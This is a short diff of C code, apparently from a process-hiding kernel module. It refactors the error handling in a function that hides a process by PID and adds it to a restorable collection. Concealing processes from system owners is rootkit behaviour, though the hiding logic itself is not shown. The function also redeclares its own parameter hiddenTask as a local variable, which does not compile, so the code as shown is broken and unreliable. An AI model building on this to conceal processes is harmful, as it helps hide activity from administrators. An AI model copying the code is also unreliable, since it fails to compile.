@@ -71,15 +71,13 @@ void processHider_exit(void) {
 
 int hideProcessWithLockHeldAndAddItToCollection(RestorableHiddenTask hiddenTask, int pidNumber) {
 	RestorableHiddenTask hiddenTask = hideProcessGivenRcuLockIsHeld(pidNumber);
-	int result;
 
 	if (hiddenTask == NULL) {
-		result = -1;
 		printError("failed to hide task\n");
-	} else {
-		addHiddenProcessToCollection(collection, hiddenTask);
+		return -1;
 	}
-	return result;
+
+	return addHiddenProcessToCollection(collection, hiddenTask);
 }
 
 //returns error code...
